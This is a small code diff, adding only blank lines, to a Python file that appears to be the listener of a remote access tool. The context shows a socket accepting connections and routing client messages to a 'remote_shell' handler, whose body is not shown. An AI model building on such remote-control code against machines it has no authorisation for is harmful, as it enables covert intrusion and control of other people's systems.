@@ -29,12 +29,14 @@ def remote_sock():
     rat_socket.setblocking(False)
     sel.register(rat_socket, selectors.EVENT_READ, accept_connection)
 
+
 # Accept connection, register conn with selector for read events, execute remote_shell when conn sends message
 def accept_connection(rat_socket):
     conn, addr = rat_socket.accept()
     print('Connected', addr)
     conn.setblocking(False)
     sel.register(conn, selectors.EVENT_READ, remote_shell)
+
 
 # Receive our message from client, if or else, execute the functions listed.
 def remote_shell(conn):
